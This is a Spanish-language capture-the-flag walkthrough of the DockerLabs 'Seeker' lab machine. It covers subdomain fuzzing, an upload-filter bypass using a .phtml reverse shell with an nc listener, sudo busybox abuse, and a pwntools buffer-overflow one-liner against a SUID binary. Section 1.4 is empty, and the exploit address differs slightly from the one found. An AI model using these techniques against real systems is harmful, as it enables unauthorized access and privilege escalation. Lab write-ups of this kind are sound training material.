## Introducción

Este documento presenta la resolución completa de la máquina **Seeker**, desarrollada por *maciiii___* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web con un dominio virtual. Mediante enumeración de subdominios, se descubre `crosswords.5eEk3r.dl` con una herramienta de codificación ROT14, y posteriormente `admin.crosswords.5eEk3r.dl` con un formulario de subida de archivos. Aunque las extensiones `.php` están bloqueadas, `.phtml` es aceptada, permitiendo la subida de una reverse shell y obteniendo acceso como `www-data`.
Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `busybox` como `astu`. Finalmente, se encuentra un binario SUID vulnerable a **buffer overflow** que, al ser explotado, otorga acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Seeker.zip
sudo bash auto_deploy.sh Seeker.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Seeker/{content,exploits,nmap,scripts}
cd Seeker
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1770188453/Ports_xruocj.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p80 172.17.0.2
```

---

### 1.3 Enumeración web

Se identifica un posible dominio virtual `5eEk3r.dl`. Se agrega al `/etc/hosts`:

```bash
echo "172.17.0.2 5eEk3r.dl" | sudo tee -a /etc/hosts
```

Se realiza un escaneo de directorios sin resultados relevantes. Se procede al fuzzing de subdominios:

```bash
ffuf -u "http://5eEk3r.dl/" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.5eEk3r.dl" -fw 3427
```

![FFUF](https://res.cloudinary.com/dewqswzke/image/upload/v1780187906/Fuff_ljw91h.png)

Se descubre el subdominio `crosswords`. Se agrega al `/etc/hosts`:

```bash
echo "172.17.0.2 crosswords.5eEk3r.dl" | sudo tee -a /etc/hosts
```

![Crosswords](https://res.cloudinary.com/dewqswzke/image/upload/v1780187910/codificador_ijwx6c.png)

### 1.4 Fuzzing de subdominios adicionales

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Subida de reverse shell

El formulario de subida bloquea `.php`, pero permite `.phtml`. Se sube una reverse shell en `.phtml`.

Se inicia un listener:

```bash
nc -nlvp 443
```

Se accede a:

```
http://crosswords.5eEk3r.dl/reverse.phtml
```

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1780187854/reverseShell_y79ftr.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → astu

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1780187852/sudo-lwwwdata_ppwjvx.png)

Se puede ejecutar `busybox` como `astu`:

```bash
sudo -u astu busybox sh
```

![Astu](https://res.cloudinary.com/dewqswzke/image/upload/v1780187911/astu_eofac6.png)

### 3.2 De astu → root

Se encuentra un binario SUID `/secure/bs64` que convierte texto a Base64:

![Secure](https://res.cloudinary.com/dewqswzke/image/upload/v1780187852/Secure_rd1h0l.png)

Se identifica que es vulnerable a **buffer overflow**. Se genera un patrón:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
```

![Segfault](https://res.cloudinary.com/dewqswzke/image/upload/v1780187852/SegFault_epgikt.png)

Se analiza con `pwndbg` y se obtiene el offset de 72 bytes. Se encuentra la dirección de la función `fire`:

```bash
objdump -d bs64 | grep -E "win|shell|fire|flag|backdoor"
```

![Fire](https://res.cloudinary.com/dewqswzke/image/upload/v1780187908/Fire_he4c0o.png)

Dirección: `0x40136a` (en little-endian: `\x6a\x13\x40\x00\x00\x00\x00\x00`)

Se explota con Python:

```python
python3 -c "from pwn import *; p=process('./bs64'); p.sendline(b'A' * 72 + p64(0x40136b)); p.interactive()"
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1780187853/root_jfjrlw.png)
